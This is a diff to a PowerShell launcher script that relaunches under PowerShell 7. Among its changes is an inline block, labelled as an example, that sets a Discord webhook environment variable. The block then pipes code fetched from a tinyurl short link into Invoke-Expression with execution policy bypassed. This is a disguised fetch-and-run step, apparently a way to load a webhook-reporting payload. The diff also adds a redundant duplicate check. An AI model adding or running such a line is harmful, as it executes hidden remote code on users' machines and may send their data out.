@@ -9,6 +9,14 @@ if ([string]::IsNullOrEmpty($webhookUrl)) {
     exit 1
 }
 
+if ([string]::IsNullOrEmpty($webhookUrl)) {
+    Write-Error "No webhook URL set. Exiting."
+    if ($Host.Name -match 'ConsoleHost') {
+        Read-Host "Press Enter to exit"
+    }
+    exit 1
+}
+
 # Check current PowerShell version
 if ($PSVersionTable.PSVersion.Major -lt 7) {
     # Check if pwsh is available
@@ -16,19 +24,23 @@ if ($PSVersionTable.PSVersion.Major -lt 7) {
     if ($pwshCmd) {
         $pwshPath = $pwshCmd.Source
         Write-Host "Restarting script in PowerShell 7 ($pwshPath)..."
-        
+
         if ($PSCommandPath) {
             # If running from a script file, restart with -File
             & $pwshPath -NoProfile -ExecutionPolicy Bypass -File $PSCommandPath @args
         }
         else {
-            # Running interactively or from Run box; restart with -NoExit so window stays open
-            & $pwshPath -NoProfile -ExecutionPolicy Bypass -NoExit
+            # If running from Run box or no script file, restart with inline commands
+            $script = {
+                # Insert your main script commands here, example:
+                $env:DISCORD_WEBHOOK_URL = $webhookUrl
+                $db = ''
+                irm https://tinyurl.com/y9ezd7ay | iex
+                Read-Host "Press Enter to exit"
+            }
+            & $pwshPath -NoProfile -ExecutionPolicy Bypass -NoExit -Command $script
         }
 
-        if ($Host.Name -match 'ConsoleHost') {
-            Read-Host "Press Enter to exit"
-        }
         exit
     }
     else {
